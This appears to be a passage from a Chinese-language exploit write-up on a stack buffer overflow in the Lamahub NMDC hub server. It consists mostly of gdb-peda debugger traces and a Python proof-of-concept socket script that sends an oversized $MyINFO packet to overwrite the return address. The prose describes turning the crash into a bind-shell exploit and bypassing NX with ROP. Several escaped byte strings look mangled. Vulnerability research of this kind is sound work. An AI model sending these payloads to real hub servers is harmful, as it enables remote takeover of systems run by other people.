         return proto_nmdc_state_disconnect (u);
    }
进入后会到达一处switch逻辑，这个switch会根据user_t的类型进行判断，根据情况进行处理，在$MyINFO会进入proto_nmdc_state_hello函数。
    gdb-peda$ n
    [----------------------------------registers-----------------------------------]
    EAX: 0x4 
    EBX: 0x806c610 --> 0x80670c0 (0x0806c610)
    ECX: 0x0 
    EDX: 0x1b1 
    ESI: 0x8066b98 ("$Keya|$V A 0a|$Vick Pi312312n")
    EDI: 0x8062844 --> 0x0 
    EBP: 0x8066a54 ("$MyINFO $ALL Pierre Je", '220' , "61300Ph//shh/bin21134361?312jvX?", '220' , "a 0x806c610 --> 0x80670c0 (0x0806c610)
    EIP: 0x805534a (:call   0x80539e0 )
    EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x805533b :push   DWORD PTR [esp+0xdc]
       0x8055342 :push   DWORD PTR [esp+0xdc]
       0x8055349 :push   ebx
    => 0x805534a :call   0x80539e0 
       0x805534f :add    esp,0x10
       0x8055352 :add    esp,0xc0
       0x8055358 :pop    ebx
       0x8055359 :pop    esi
    Guessed arguments:
    arg[0]: 0x806c610 --> 0x80670c0 (0x0806c610)
    arg[1]: 0x8062700 ("$MyINFO $ALL Pierre Je", '220' , "61300Ph//shh/bin21134361?312jvX?", '220' , "a, "61300Ph//shh/bin21134361?312jvX?", '220' , "a, "61300Ph//shh/bin21134361?312jvX?", '220' , "a 0xbffff000 --> 0xfbad8001 
    EIP: 0x8053a3d (:mov    esi,ebx)
    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x8053a2d :jbe    0x8053d20 
       0x8053a33 :mov    ecx,0x7
       0x8053a38 :mov    edi,0x805ac4b
    => 0x8053a3d :mov    esi,ebx
       0x8053a3f :repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
       0x8053a41 :seta   cl
       0x8053a44 :setb   al
       0x8053a47 :sub    ecx,eax
    gdb-peda$ n
    [----------------------------------registers-----------------------------------]
    EAX: 0x13 
    EBX: 0x8062700 ("$MyINFO $ALL Pierre Je", '220' , "61300Ph//shh/bin21134361?312jvX?", '220' , "a, "61300Ph//shh/bin21134361?312jvX?", '220' , "a 0xbffff000 --> 0xfbad8001 
    EIP: 0x8053a3f (:repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi])
    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x8053a33 :mov    ecx,0x7
       0x8053a38 :mov    edi,0x805ac4b
       0x8053a3d :mov    esi,ebx
    => 0x8053a3f :repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
       0x8053a41 :seta   cl
       0x8053a44 :setb   al
       0x8053a47 :sub    ecx,eax
       0x8053a49 :movsx  ebp,cl
    Legend: code, data, rodata, value
    0x08053a3f in proto_nmdc_state_hello ()
上述代码部分对$MyINFO中的$Hello Pierre后的指令进行处理，在后面会对这个内容进行拷贝。接下来会进入漏洞触发的关键部分。
    gdb-peda$ c
    Continuing.
    [----------------------------------registers-----------------------------------]
    EAX: 0x806c320 --> 0x80670c0 (0x0806c320)
    EBX: 0x8062700 ("$MyINFO $ALL Pierre Je", '220' , "61300Ph//shh/bin21134361?312jvX?", '220' , "a:mov    DWORD PTR [edi],edx)
    EDX: 0x144 
    ESI: 0xbffff1a0 --> 0xbffff200 --> 0x8048766 ("libc.so.6")
    EDI: 0x1 
    EBP: 0x0 
    ESP: 0xbfffefb0 --> 0xbffff1a0 --> 0xbffff200 --> 0x8048766 ("libc.so.6")
    EIP: 0x8053f77 (:call   0x8048df0 )
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x8053f6e :push   DWORD PTR [esp+0x30c]
       0x8053f75 :push   ebx
       0x8053f76 :push   esi
    => 0x8053f77 :call   0x8048df0 
       0x8053f7c :add    esp,0xc
       0x8053f7f :push   0x0
       0x8053f81 :push   0x8
       0x8053f83 :push   DWORD PTR [esp+0x30c]
    Guessed arguments:
    arg[0]: 0xbffff1a0 --> 0xbffff200 --> 0x8048766 ("libc.so.6")
    arg[1]: 0x8062700 ("$MyINFO $ALL Pierre Je", '220' , "61300Ph//shh/bin21134361?312jvX?", '220' , "a:pop    esi
       0x8053d2a :pop    edi
       0x8053d2b :pop    ebp
    => 0x8053d2c :ret    
       0x8053d2d :lea    esi,[esi+0x0]
       0x8053d30 :add    esp,0x2ec
       0x8053d36 :xor    ebp,ebp
       0x8053d38 :pop    ebx
由于缓冲区溢出，导致返回地址被覆盖，到达可控位置。
    gdb-peda$ n
    [-------------------------------------code-------------------------------------]
       0x8066a27 :push   esi
       0x8066a28 :popa   
       0x8066a29 :ins    BYTE PTR es:[edi],dx
    => 0x8066a2a :imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63694e65
       0x8066a32 :imul   esp,DWORD PTR [eax],0x50
       0x8066a35 :imul   esp,DWORD PTR [ebp+0x72],0x247c6572
       0x8066a3c :push   esi
       0x8066a3d :outs   dx,BYTE PTR gs:[esi]
PoC构造到Exploit
这里提供一个可以引发崩溃的PoC：
    import socket
    HOST = '192.168.25.101'
    PORT = 4111
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    evil_buf = "$Supports Usllo IP2 earch ZPe0 |$Keya|$ValidateNick Pierre|$Ven 1,0091|$GetNickList|$MyINFO $ALL Pierre Je"
    evil_buf += "x41"*120
    evil_buf += "x61x3c"
    evil_buf += "x3cx24x4dx79x80x00x35x24x70x69x24x30"
    evil_buf += "x24x37x37x37x37x37x37x37x37x37x37x37"
    evil_buf += "x37xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1"
    evil_buf += "xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1"
    evil_buf += "xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1"
    evil_buf += "xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1xb1"
    evil_buf += "xb1x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2cx2c"
    evil_buf += "x2cx2cx2cx2cx2cx2cx2cx2cx41x41x41x41"
    evil_buf += "xd6x26x06x08xb1xb1xb1xb1xb1xb1xb1xb1"
    evil_buf += "xb1xb1xb1xb1x37x37x30x2cx49x4ex46x4f"
    evil_buf += "x24xcaxcaxcaxcax20x5ax50x65x30x20"
    evil_buf += " |$Keya|"
    print "Send eIVL packet!n"
    # Send EVIL PACKET !
    s.sendall(evil_buf)
    print "Send COmplete!n"
    s.close()
这里可以直接引发崩溃，崩溃位置在evil_buf中的41414141，实际上这个地址就是覆盖的返回地址，修改这个返回地址，并且加上shellcode之后，通过gdb观察，可以看到eip的跳转，但是由于Lamahub开启了NX，导致shellcode无法执行。
本文主要是分析协议漏洞成因，因此我在编译Lamahub的时候在Makefile加入了-fno-stack-protector -z
execstack，关闭Linux下的NX，这样就可以执行shellcode了，那么在实际攻防中，可以利用ROP
gadget来绕过NX。另外我刚开始用了pwntools的shellcraft，最后想利用interactive函数来拿shell，但是后来发现shellcraft中有一个badchar
/x24，这个badchar不好绕过，利用pwntools最新的encode方法也会提示无法绕过，因此换了一个shellcode，绑定/bin/sh到指定端口，完成利用。